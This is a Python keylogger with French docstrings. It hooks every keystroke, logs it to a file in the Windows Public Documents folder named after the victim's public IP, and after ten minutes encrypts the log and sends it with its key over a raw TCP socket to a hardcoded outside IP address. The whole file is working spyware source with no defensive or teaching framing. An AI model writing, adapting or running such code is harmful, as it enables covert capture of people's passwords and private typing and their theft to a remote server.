import socket
import time
import keyboard
from unidecode import unidecode
import requests
import datetime
from cryptography.fernet import Fernet
import os

class Fichier:
    """
    Cette classe fournit des fonctionnalités pour enregistrer les frappes clavier,
    chiffrer les données et les envoyer au serveur.

    Attributes:
    - majuscule_active (bool): Indique si la touche de verrouillage majuscule est active.
    - nom_fichier (str): Le chemin du fichier où les frappes clavier sont enregistrées.

    Methods:
    - get_ip(): Récupère l'adresse IP publique de l'appareil.
    - get_keyboard(e): Enregistre les frappes clavier dans un fichier texte.
    - encrypt_and_send_file(): Chiffre le contenu du fichier et l'envoie au serveur.
    - send_encrypted_file(key, encrypted_text, server_address, server_port): Envoie un fichier chiffré au serveur.
    - start_keyboard(): Initialise l'enregistrement des frappes clavier et définit un raccourci clavier pour arrêter le programme.
    - stop_program(): Arrête le programme en cours d'exécution.
    """

    def __init__(self):
        self.majuscule_active = False
        self.nom_fichier = ""

    def get_ip(self):
        """
        Cette fonction récupère l'adresse IP publique de l'appareil en interrogeant 
        le service web 'https://httpbin.org/ip'.

        Returns:
        - Si la requête est réussie (status_code == 200),
        l'adresse IP est extraite de la réponse JSON et renvoyée.
        - Sinon, None est renvoyé.
        """
        try:
            response = requests.get('https://httpbin.org/ip')
            if response.status_code == 200:
                ip_address = response.json().get('origin')
                return ip_address
            else:
                return None
        except Exception as e:
            return None

    def get_keyboard(self, e):
        """
        Cette fonction enregistre les frappes clavier dans un fichier texte.

        Args:
        - e: L'événement de frappe clavier à traiter.

        Cette fonction écoute les événements de frappe clavier.
        Chaque touche enfoncée est enregistrée dans un fichier texte
        qui est défini en fonction de l'adresse IP, de la date et de l'heure. 

        """
        if not self.nom_fichier:
            ip_personne = self.get_ip() or "unknown"
            documents_path = "C:\\Users\\Public\\Documents"
            file_name = f"{ip_personne}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
            self.nom_fichier = os.path.join(documents_path, file_name)

        liste_mots = []
        if e.event_type == keyboard.KEY_DOWN:
            if e.name == "space":
                liste_mots.append(" ")
            elif e.name == "backspace" or e.name == "delete" or e.name == "suppr":
                if liste_mots:
                    liste_mots.pop()
            elif e.name == "enter":
                liste_mots.append("\n")
            elif e.name == "tab":
                liste_mots.append("\t")
            elif e.name == "esc":
                liste_mots.append("")
            elif e.name == "ctrl":
                liste_mots.append(" ctrl+")
            elif e.name == "haut":
                liste_mots.append("↑")
            elif e.name == "bas":
                liste_mots.append("↓")
            elif e.name == "droite":
                liste_mots.append("→")
            elif e.name == "gauche":
                liste_mots.append("←")
            elif e.name == "verr.maj" or e.name == "maj":
                liste_mots.append("")
            else:
                liste_mots.append(unidecode(e.name))

        with open(self.nom_fichier, "a", encoding='utf-8') as fichier:
            for mots in liste_mots:
                fichier.write(mots)

    def encrypt_and_send_file(self):
        """
        Cette fonction chiffre le contenu du fichier actuel et l'envoie au serveur.

        - Génère une clé de chiffrement symétrique à l'aide de Fernet.
        - Lit le contenu du fichier actuel.
        - Chiffre le contenu du fichier à l'aide de la clé générée.
        - Envoie le fichier chiffré au serveur.

        """
        server_address = "162.19.252.34"
        server_port = 12345
        key = Fernet.generate_key()
        cipher_suite = Fernet(key)

        with open(self.nom_fichier, 'rb') as file:
            plaintext = file.read()

        encrypted_text = cipher_suite.encrypt(plaintext)

        self.send_encrypted_file(key, encrypted_text, server_address, server_port)

    def send_encrypted_file(self, key, encrypted_text, server_address, server_port):
        """
        Cette fonction envoie un fichier chiffré via une connexion TCP au serveur.

        Args:
        - key : La clé de chiffrement symétrique utilisée pour chiffrer le fichier.
        - encrypted_text : Le texte chiffré du fichier à envoyer.
        - server_address : L'adresse IP du serveur de destination.
        - server_port : Le port sur le serveur pour la réception du fichier.

        Cette fonction crée un socket client, se connecte au serveur à l'adresse et au port,
        envoie d'abord la clé de chiffrement, puis envoie le texte chiffré du fichier.
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((server_address, server_port))
                client_socket.sendall(key)
                client_socket.sendall(encrypted_text)

            print("")
        except Exception as e:
            print(f"{e}")

    def start_keyboard(self):
        """
        Cette fonction initialise l'enregistrement des frappes clavier et définit un raccourci clavier pour arrêter le programme(ctrl alt g).
        """
        custom_combination = 'ctrl+alt+g'
        keyboard.hook(self.get_keyboard)
        keyboard.add_hotkey(custom_combination, self.stop_program)
        time_limit = 10 * 60
        start_time = time.time()

        try:
            while time.time() - start_time < time_limit:
                time.sleep(1)
        except KeyboardInterrupt:
            pass  

    def stop_program(self):
        """
        Cette fonction arrête le programme en cours d'exécution.
        """
        exit()

if __name__ == "__main__":
    fichier = Fichier()
    fichier.start_keyboard()
    fichier.encrypt_and_send_file()
